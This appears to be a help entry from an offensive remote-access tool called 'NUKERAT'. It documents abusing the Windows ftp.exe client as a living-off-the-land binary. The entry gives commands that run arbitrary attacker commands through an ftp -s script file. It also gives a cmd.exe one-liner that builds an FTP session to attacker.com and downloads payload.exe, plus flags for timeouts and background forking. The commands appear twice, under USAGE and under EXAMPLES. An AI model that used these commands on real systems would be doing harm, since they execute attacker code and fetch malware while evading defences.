ABOUT
    Legacy FTP client. LOLBAS runs attacker commands from a script
    file passed with -s or builds a one-liner that downloads remote
    payloads through scripted FTP sessions.

USAGE:
    echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
    cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"

EXAMPLES:
    echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
    cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
